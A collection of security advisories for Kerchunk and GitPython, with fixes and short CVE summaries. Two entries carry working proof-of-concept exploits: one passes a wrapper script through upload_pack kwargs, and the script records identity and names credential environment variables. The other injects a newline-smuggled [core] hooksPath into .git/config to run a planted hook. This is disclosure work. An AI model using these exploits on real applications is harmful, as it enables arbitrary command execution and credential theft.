HDF5 / NetCDF / GRIB archives hosted on object storage.  Realistic attack vectors:  - A user opens a community-shared Kerchunk catalogue link via xarray/dask. - A managed data-science platform (notebook server, batch job runner)   ingests user-submitted Kerchunk URLs. - A workflow downloads a catalogue from a bucket whose contents have   been tampered with (supply chain).  In every case, the victim performs no action beyond opening a "reference filesystem" — there is no documented expectation that a data catalogue can execute arbitrary Python code.  ### Suggested fix  Replace `jinja2.Template(...)` with a shared `jinja2.sandbox.ImmutableSandboxedEnvironment` for all three sinks. This matches the post-incident hardening applied to `llama-cpp-python` after CVE-2024-34359.  ```python # At module top def _sandboxed_env():     import jinja2.sandbox     env = getattr(_sandboxed_env, "_env", None)     if env is None:         env = jinja2.sandbox.ImmutableSandboxedEnvironment()         _sandboxed_env._env = env     return env ```  Then in each sink, replace `jinja2.Template(s).render(...)` with `_sandboxed_env().from_string(s).render(...)`.  The legitimate Kerchunk template syntax (simple variable substitution like `{{ varname }}`) continues to work under the sandbox; only the SSTI gadgets (`__class__`, `__init__.__globals__`, `__subclasses__`, etc.) are refused with `jinja2.exceptions.SecurityError`.  A complete patch is available on request.  ### Credit  Reported by Dany.A

### Summary GitPython blocks dangerous Git options such as `--upload-pack` and `--receive-pack` by default, but the equivalent Python kwargs `upload_pack` and `receive_pack` bypass that check. If an application passes attacker-controlled kwargs into `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`, this leads to arbitrary command execution even when `allow_unsafe_options` is left at its default value of `False`.  ### Details GitPython explicitly treats helper-command options as unsafe because they can be used to execute arbitrary commands:  - `git/repo/base.py:145-153` marks clone options such as `--upload-pack`, `-u`, `--config`, and `-c` as unsafe. - `git/remote.py:535-548` marks fetch/pull/push options such as `--upload-pack`, `--receive-pack`, and `--exec` as unsafe.  The vulnerable API paths check the raw kwarg names before they're its normalized into command-line flags:  - `Repo.clone_from()` checks `list(kwargs.keys())` in `git/repo/base.py:1387-1390` - `Remote.fetch()` checks `list(kwargs.keys())` in `git/remote.py:1070-1071` - `Remote.pull()` checks `list(kwargs.keys())` in `git/remote.py:1124-1125` - `Remote.push()` checks `list(kwargs.keys())` in `git/remote.py:1197-1198`  That validation is performed by `Git.check_unsafe_options()` in `git/cmd.py:948-961`. The validator correctly blocks option names such as `upload-pack`, `receive-pack`, and `exec`.  Later, GitPython converts Python kwargs into Git command-line flags in `Git.transform_kwarg()` at `git/cmd.py:1471-1484`. During that step, underscore-form kwargs are dashified:  - `upload_pack=...` becomes `--upload-pack=...` - `receive_pack=...` becomes `--receive-pack=...`  Because the unsafe-option check runs before this normalization, underscore-form kwargs bypass the safety check even though they become the exact dangerous Git flags that the code is supposed to reject.  In practice:  - `remote.fetch(**{"upload-pack": helper})` is blocked with `UnsafeOptionError` - `remote.fetch(upload_pack=helper)` is allowed and reaches helper execution  The same bypass works for:  ```python Repo.clone_from(origin, out, upload_pack=helper) repo.remote("origin").fetch(upload_pack=helper) repo.remote("origin").pull(upload_pack=helper) repo.remote("origin").push(receive_pack=helper) ```  This does not appear to affect every unsafe option. For example, `exec=` is already rejected because the raw kwarg name `exec` matches the blocked option name before normalization.  Existing tests cover the hyphenated form, not the vulnerable underscore form. For example:  - `test/test_clone.py:129-136` checks `{"upload-pack": ...}` - `test/test_remote.py:830-833` checks `{"upload-pack": ...}` - `test/test_remote.py:968-975` checks `{"receive-pack": ...}`  Those tests correctly confirm the literal Git option names are blocked, but they do not exercise the normal Python kwarg spelling that bypasses the guard.  ### PoC 1. Create and activate a virtual environment in the repository root:  ```bash python3 -m venv .venv-sec .venv-sec/bin/pip install setuptools gitdb source ./.venv-sec/bin/activate ```  2. make a new python file and put the following in there, then run it:  ```python import os import stat import subprocess import tempfile  from git import Repo from git.exc import UnsafeOptionError  # Setup: create isolated repositories so the PoC uses a normal fetch flow. base = tempfile.mkdtemp(prefix="gp-poc-risk-") origin = os.path.join(base, "origin.git") producer = os.path.join(base, "producer") victim = os.path.join(base, "victim") proof = os.path.join(base, "proof.txt") wrapper = os.path.join(base, "wrapper.sh")  # Setup: this wrapper is just to demo things you can do, not required for the exploit to work # you could also do something like an SSH reverse shell, really anything with open(wrapper, "w") as f:     f.write(f"""#!/bin/sh {{   echo "code_exec=1"   echo "whoami=$(id)"   echo "cwd=$(pwd)"   echo "uname=$(uname -a)"   printf 'argv='; printf '<%s>' "$@"; echo   env | grep -E '^(HOME|USER|PATH|SSH_AUTH_SOCK|CI|GITHUB_TOKEN|AWS_|AZURE_|GOOGLE_)=' | sed 's/=.*$/=<redacted>/' || true }} > '{proof}' exec git-upload-pack "$@" """) os.chmod(wrapper, stat.S_IRWXU)  subprocess.run(["git", "init", "--bare", origin], check=True, stdout=subprocess.DEVNULL) subprocess.run(["git", "clone", origin, producer], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  with open(os.path.join(producer, "README"), "w") as f:     f.write("x")  subprocess.run(["git", "-C", producer, "add", "README"], check=True, stdout=subprocess.DEVNULL) subprocess.run(     ["git", "-C", producer, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-m", "init"],     check=True,     stdout=subprocess.DEVNULL, ) subprocess.run(["git", "-C", producer, "push", "origin", "HEAD"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) subprocess.run(["git", "clone", origin, victim], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  repo = Repo(victim) remote = repo.remote("origin")  # the literal Git option name is properly blocked. try:     remote.fetch(**{"upload-pack": wrapper})     print("control=unexpected_success") except UnsafeOptionError:     print("control=blocked")  # this is the actual vulnerability # you can also just do upload_pack="touch /tmp/proof", the wrapper is just to show greater impact # if you do the "touch /tmp/proof" the script will crash, but the file will have been created remote.fetch(upload_pack=wrapper)  # Proof: the helper ran as the GitPython host process. print("proof_exists", os.path.exists(proof), proof) print(open(proof).read()) ```  3. Expected result:  - The script prints `control=blocked` - The script prints `proof_exists True ...` - The proof file contains evidence that the attacker-controlled helper executed as the local application account, including `id`, working directory, argv, and selected environment variable names  Example output:  ```bash GitPython % python3 test.py control=blocked proof_exists True /var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/proof.txt code_exec=1 whoami=uid=501(wes) gid=20(staff) <redacted> cwd=/private/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/victim uname=Darwin  <redacted> Darwin Kernel Version  <redacted>; root:xnu-11417. <redacted> argv=</var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/origin.git> USER=<redacted> SSH_AUTH_SOCK=<redacted> PATH=<redacted> HOME=<redacted> ```  This PoC does not require a malicious repository. The PoC uses that fresh blank repository. The only attacker-controlled input is the kwarg that GitPython turns into `--upload-pack`.  ### Impact Who is impacted: - Web applications that let users configure repository import, sync, mirroring, fetch, pull, or push behavior - Systems that accept a user-provided dict of "extra Git options" and pass it into GitPython with `**kwargs` - CI/CD systems, workers, automation bots, or internal tools that build GitPython calls from untrusted integration settings or job definitions (yaml, json, etc configs )  What the attacker needs to control:  - A value that becomes `upload_pack` or `receive_pack` in the kwargs passed to `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`  From a severity perspective, this could lead to - Theft of SSH keys, deploy credentials, API tokens, or cloud credentials available to the process - Modification of repositories, build outputs, or release artifacts - Lateral movement from CI/CD workers or automation hosts - Full compromise of the worker or service process handling repository operations  The highest-risk environments are network-reachable services and automation systems that expose these GitPython kwargs across a trust boundary while relying on the default unsafe-option guard for protection.

`GitConfigParser.set_value()` passes values to Python's `configparser` without validating for newlines. GitPython's own `_write()` converts embedded newlines into indented continuation lines (e.g. `
` becomes `
	`), but Git still accepts an indented `[core]` stanza as a section header — so the injected `core.hooksPath` becomes effective configuration. Any Git operation that invokes hooks (commit, merge, checkout) will then execute scripts from the attacker-controlled path.  The vulnerability is not merely malformed config output: GitPython's own writer converts embedded newlines into indented continuation lines, but Git still accepts an indented `[core]` stanza as a section header, so the injected `core.hooksPath` becomes effective configuration.  This was found while auditing MLRun's `project.push()` method, which passes `author_name` and `author_email` directly to `config_writer().set_value()` with no sanitization. Both parameters cross a trust boundary — they are caller-supplied API inputs that end up in `.git/config`.  PoC (standalone, no MLRun required):  ```python import git, subprocess, os  repo = git.Repo("/tmp/testrepo")  with repo.config_writer() as cw:     cw.set_value("user", "name", "foo
[core]
hooksPath=/tmp/hooks")  r = subprocess.run(["git", "config", "core.hooksPath"], cwd="/tmp/testrepo", capture_output=True, text=True) assert r.returncode == 0 print(r.stdout.strip())  # /tmp/hooks  os.makedirs("/tmp/hooks", exist_ok=True) open("/tmp/hooks/pre-commit", "w").write("#!/bin/sh
id > /tmp/pwned
") os.chmod("/tmp/hooks/pre-commit", 0o755)  repo.index.add(["README"]) repo.git.commit(m="test") print(open("/tmp/pwned").read())  # uid=... ```  Tested on GitPython 3.1.46, git 2.39+.  Impact: This is persistent repo config poisoning. Any user who can supply `author_name` or `author_email` to an application calling `config_writer().set_value()` can redirect Git hook execution to an arbitrary path. In a multi-user or hosted environment (e.g. a shared MLRun server where multiple users push to the same repositories), one user can poison the `.git/config` of a shared repo and have their hooks run in the context of every subsequent Git operation by any user. On single-user deployments, the impact depends on whether the application later invokes Git hooks automatically.  Remediation: `set_value()` should raise on CR, LF, or NUL in values rather than silently pass them through:  ```python import re  if isinstance(value, (str, bytes)) and re.search(r"[
\x00]", str(value)):     raise ValueError("Git config values must not contain CR, LF, or NUL") ```  Rejecting is safer than stripping — a stripped newline might indicate the caller is passing unsanitized input at a higher level, and silent normalization masks that.  Affected wherever `config_writer().set_value(section, key, user_input)` is called with external input.** GitPython is a dependency of DVC, MLflow, Kedro, and others — worth auditing their `set_value()` call sites for externally influenced inputs.

GitPython before 3.1.60 contains a regular expression denial of service vulnerability in Actor.name_email_regex that processes commit author and committer fields. Attackers can craft a commit object with a malformed author field containing an unterminated angle bracket to cause quadratic backtracking, exhausting CPU resources for over two minutes per commit access.

GitPython before 3.1.50 fails to validate newline characters in the section parameter of config_writer(), allowing attackers to inject arbitrary section headers into .git/config. Attackers can inject newlines to create a forged [core] section with hooksPath pointing to attacker-controlled directories, achieving remote code execution when git hooks are triggered.

GitPython before 3.1.60 fails to properly validate the git directory location, allowing attackers to impersonate the git directory using tracked files like gitdir, commondir, and HEAD. Attackers can execute arbitrary code by placing a malicious pre-commit hook in the tracked hooks directory that executes when a victim calls index.commit() on a cloned or opened repository.

GitPython before 3.1.53 fails to properly escape section names in git config files, allowing attackers to inject arbitrary configuration directives through malicious submodule names. Attackers can inject core.sshCommand or other dangerous config keys into the victim's .git/config via create_submodule or clone_from operations, achieving remote code execution when git performs ssh operations.

GitPython is a python library used to interact with Git repositories. Prior to version 3.1.47, _clone() validates multi_options as the original list, then executes shlex.split(" ".join(multi_options)). A string like "--branch main --config core.hooksPath=/x" passes validation (starts with --branch), but after split becomes ["--branch", "main", "--config", "core.hooksPath=/x"]. Git applies the config and executes attacker hooks during clone. This issue has been patched in version 3.1.47.

Prior to version 3.1.48, a vulnerability in GitPython allows attackers who can supply a crafted reference path to an application using GitPython to write, overwrite, move, or delete files outside the repository’s .git directory via insufficient validation of reference paths in reference creation, rename, and delete operations. This issue has been patched in version 3.1.48.
